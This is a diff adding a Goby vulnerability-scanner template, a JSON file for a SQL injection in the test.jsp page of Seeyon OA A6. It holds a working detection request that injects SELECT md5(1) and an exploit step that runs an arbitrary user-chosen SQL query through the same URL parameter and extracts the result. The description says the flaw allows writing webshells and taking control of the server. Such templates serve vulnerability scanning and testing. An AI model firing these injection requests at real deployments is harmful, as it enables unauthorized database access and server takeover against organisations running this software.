@@ -1,0 +1,78 @@
+{
+      "Name": "Seeyon OA A6 test.jsp SQL injection",
+      "Level": "2",
+      "Tags": [
+            "SQL Injection"
+      ],
+      "GobyQuery": "app=\"Yonyou-Seeyon-OA\"",
+      "Description": "Seeyon OA A6  test.jsp There is a SQL injection vulnerability, and the server can be controlled by injecting and writing webshell files",
+      "Product": "Seeyon OA A6 ",
+      "Homepage": "https://www.seeyon.com/",
+      "Author": "PeiQi",
+      "Impact": "<p>Controlling the server by injecting and writing webshell files<br></p>",
+      "Recommandation": "",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+	  "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "SQL",
+			"type": "select",
+			"value": "SELECT @@basedir",
+			"show": ""
+		}
+	  ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(1))",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "c4ca4238a0b923820dcc509a6f75849b",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "SetVariable": [
+					"output|lastbody|regex|<td align=left>(.*?)</td>"
+				  ]
+            }
+      ],
+      "PostTime": "2021-04-05 12:04:57",
+      "GobyVersion": "1.8.255"
+}
